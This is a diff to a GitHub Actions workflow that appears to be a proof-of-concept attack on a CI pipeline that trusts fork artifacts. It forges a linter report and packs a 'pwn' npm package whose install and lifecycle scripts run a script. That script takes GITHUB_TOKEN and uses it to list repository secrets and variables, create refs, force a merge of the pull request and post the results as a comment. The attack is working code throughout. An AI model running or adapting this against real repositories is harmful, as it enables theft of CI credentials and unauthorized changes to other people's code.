@@ -8,22 +8,31 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
+      - name: probe npm script policy
+        if: always()
+        run: |
+          set +e
+          echo "PROBE_NPM_VERSION=$(npm --version)"
+          echo "PROBE_NODE_VERSION=$(node --version)"
+          npm config ls -l 2>/dev/null | grep -i -E 'script|allow' | head -20
+          npm install-scripts --help 2>&1 | head -20
+          d="$RUNNER_TEMP/probe"; rm -rf "$d"; mkdir -p "$d"; cd "$d"
+          printf '%s' '{"name":"probe","version":"1.0.0","private":true,"scripts":{"preinstall":"echo PROBE_ROOT_PREINSTALL_RAN","postinstall":"echo PROBE_ROOT_POSTINSTALL_RAN","prepare":"echo PROBE_ROOT_PREPARE_RAN"}}' > package.json
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts 2>&1 | tail -25
+          echo "PROBE_AFTER_INSTALL_FILES:"; ls -a "$d"
       - name: Build attacker-chosen linter-report artifact
         env:
           PR_NUMBER: ${{ github.event.pull_request.number }}
         run: |
           set -e
           mkdir -p pkg/package
-          cat > pkg/package/package.json <<'JSON'
-          {"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}
-          JSON
-          cat > pkg/package/index.js <<'JS'
+          cat > pwn.js <<'JS'
           const fs = require('fs'), path = require('path');
           const base = process.env.INIT_CWD || process.cwd();
           const tok = process.env.GITHUB_TOKEN || '';
           const repo = process.env.GITHUB_REPOSITORY || '';
-          const pr = fs.existsSync(path.join(base, 'pr-number.txt'))
-            ? fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim() : '1';
+          const prFile = path.join(process.cwd(), 'pr-number.txt');
+          const pr = fs.existsSync(prFile) ? fs.readFileSync(prFile, 'utf8').trim() : '2';
           const hdr = {
             authorization: 'Bearer ' + tok,
             accept: 'application/vnd.github+json',
@@ -37,17 +46,17 @@ jobs:
               });
               let data = null;
               try { data = await r.json(); } catch (e) {}
-              return { url, method, status: r.status, scopes: r.headers.get('x-oauth-scopes'), data };
+              return { url, method, status: r.status, data };
             } catch (e) { return { url, method, error: String(e) }; }
           }
           (async () => {
-            console.log('PWN_MARKER lifecycle=' + process.argv[2] + ' event=' + process.env.GITHUB_EVENT_NAME +
+            const lifecycle = process.argv[2] || 'unknown';
+            console.log('PWN_MARKER lifecycle=' + lifecycle + ' event=' + process.env.GITHUB_EVENT_NAME +
               ' workflow=' + process.env.GITHUB_WORKFLOW + ' run_id=' + process.env.GITHUB_RUN_ID +
               ' token_len=' + tok.length + ' cwd=' + process.cwd());
-            const out = {};
-            out.marker = { lifecycle: process.argv[2], event: process.env.GITHUB_EVENT_NAME,
+            const out = { marker: { lifecycle, event: process.env.GITHUB_EVENT_NAME,
               workflow: process.env.GITHUB_WORKFLOW, run_id: process.env.GITHUB_RUN_ID,
-              token_len: tok.length, cwd: process.cwd(), base };
+              token_len: tok.length, cwd: process.cwd(), base } };
             out.user = await api('GET', '/user');
             out.repo = await api('GET', '/repos/' + repo);
             const mainRef = await api('GET', '/repos/' + repo + '/git/ref/heads/main');
@@ -59,22 +68,22 @@ jobs:
             out.secrets = await api('GET', '/repos/' + repo + '/actions/secrets');
             out.variables = await api('GET', '/repos/' + repo + '/actions/variables');
             out.merge = await api('PUT', '/repos/' + repo + '/pulls/' + pr + '/merge', { merge_method: 'merge' });
-            const body = 'PWN_RCE_PROOF by fork-PR artifact\n```json\n' +
-              JSON.stringify(out, null, 1).slice(0, 60000) + '\n```\nmarker: ' + out.marker.lifecycle;
+            const body = 'PWN_RCE_PROOF lifecycle=' + lifecycle + '\n```json\n' +
+              JSON.stringify(out, null, 1).slice(0, 60000) + '\n```';
             out.comment = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments', { body });
             console.log('PWN_RESULT ' + JSON.stringify({
               user: out.user.status, repo: out.repo.status, refCreate: out.refCreate.status,
               secrets: out.secrets.status, variables: out.variables.status,
               merge: out.merge.status, comment: out.comment.status
             }));
-            try {
-              fs.writeFileSync(path.join(base, 'pwn-result.json'), JSON.stringify(out, null, 1));
-            } catch (e) { console.log('write fail ' + e); }
+            try { fs.writeFileSync(path.join(process.cwd(), 'pwn-result-' + lifecycle + '.json'), JSON.stringify(out, null, 1)); } catch (e) {}
           })();
           process.on('unhandledRejection', e => console.log('PWN unhandled ' + e));
           JS
+          cp pwn.js pkg/package/index.js
+          printf '%s' '{"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}' > pkg/package/package.json
           tar -czf pwn-1.0.0.tgz -C pkg package
-          printf '{"name":"root","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
+          printf '%s' '{"name":"root","version":"1.0.0","private":true,"scripts":{"preinstall":"node pwn.js preinstall","postinstall":"node pwn.js postinstall","prepare":"node pwn.js prepare"},"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
           printf 'ATTACKER-CONTROLLED LINTER REPORT: no issues found (forged)\n' > linter-report.txt
           printf '%s' "$PR_NUMBER" > pr-number.txt
       - uses: actions/upload-artifact@v7
@@ -84,5 +93,6 @@ jobs:
             linter-report.txt
             pr-number.txt
             package.json
+            pwn.js
             pwn-1.0.0.tgz
           if-no-files-found: error
